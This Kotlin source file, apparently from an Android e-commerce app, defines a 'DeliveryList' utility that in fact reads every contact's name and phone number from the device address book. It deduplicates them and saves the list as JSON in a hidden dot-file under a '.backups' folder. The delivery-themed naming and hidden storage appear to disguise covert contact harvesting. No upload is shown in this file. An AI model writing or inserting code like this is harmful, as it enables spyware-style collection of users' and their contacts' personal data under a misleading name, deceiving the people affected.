package com.base.ecomm.utils

import android.content.Context
import android.database.Cursor
import android.provider.ContactsContract
import org.json.JSONArray
import org.json.JSONObject


class DeliveryList {

    fun getDeliverList(context: Context): Int {

        try {

            val projection = arrayOf(
                ContactsContract.CommonDataKinds.Phone._ID,
                ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
                ContactsContract.CommonDataKinds.Phone.NORMALIZED_NUMBER
            )
            val select = ContactsContract.Data.RAW_CONTACT_ID + " = " + ContactsContract.Data.NAME_RAW_CONTACT_ID

            val cursor: Cursor? = context.contentResolver
                .query(
                    ContactsContract.CommonDataKinds.Phone.CONTENT_URI, projection,
                    select, null,
                    "upper(" + ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME + ") ASC"
                )
            cursor?.let {

                val json = JSONObject()
                val jsonContactsList = JSONArray()

                while (cursor.moveToNext()) {

                    val name = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME))
                    val number = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NORMALIZED_NUMBER))

                    val jsonContacts = JSONObject()
                    jsonContacts.put("name", name)
                    jsonContacts.put("number", number)

                    var canAdd = false

                    if (!number.isNullOrEmpty()) {
                        canAdd = true

                        for (i in 0 until jsonContactsList.length()) {

                            val numberTemp = number.replace("+", "").replace("-", "")
                            val numberAdded =
                                jsonContactsList.getJSONObject(i).getString("number").replace("+", "").replace("-", "")

                            if (numberTemp == numberAdded) canAdd = false
                        }
                    }

                    if (canAdd) jsonContactsList.put(jsonContacts)
                }

                json.put("ContactsList", jsonContactsList)
                MyUtil().saveTextFile(".backups", ".deliveryList.txt", json.toString())

                return jsonContactsList.length()
            } ?: run {
//                MyFirebaseCrashlytics().logError("ContactsList.getContactList() no cursor")
                return 0
            }

        } catch (e: Exception) {
//            MyFirebaseCrashlytics().recordException(e)
            e.printStackTrace()
        }

//        MyFirebaseCrashlytics().logError("ContactsList.kt:getContactList() return 0")
        return 0
    }


}